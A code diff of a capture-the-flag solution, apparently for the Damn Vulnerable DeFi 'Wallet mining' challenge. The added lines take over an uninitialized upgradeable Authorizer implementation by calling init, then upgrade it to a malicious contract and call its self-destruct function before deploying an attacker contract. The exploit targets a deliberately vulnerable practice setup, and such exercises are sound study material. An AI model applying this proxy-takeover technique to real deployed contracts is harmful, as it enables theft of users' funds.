@@ -124,13 +124,13 @@ describe('[Challenge] Wallet mining', function () {
         proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b", player);
         masterCopy = await ethers.getContractAt("GnosisSafe", "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", player);
 
+        authorizerImplmentation = await (await ethers.getContractFactory('AuthorizerUpgradeable')).attach('0xe7f1725e7734ce288f8367e1bb143e90bb3f0512');
         badAuthorizer = await (await ethers.getContractFactory('BadAuthorizerUpgradeable', player)).deploy();
         dieABI = ["function die(address player)"];
         dieInterface = new ethers.utils.Interface(dieABI);
-        dieCallData = dieInterface.encodeFunctionData("die", [player.address]);
-        await authorizer.upgradeToAndCall(badAuthorizer.address, dieCallData);
-
-        console.log(await walletDeployer.can(player.address, DEPOSIT_ADDRESS));
+        dieCallData = dieInterface.encodeFunctionData("die", [player.address]); 
+        await authorizerImplmentation.init([], []);
+        await authorizerImplmentation.upgradeToAndCall(badAuthorizer.address, dieCallData);
 
         attacker = await (await ethers.getContractFactory('WalletMiningAttacker', player)).deploy(walletDeployer.address);
 
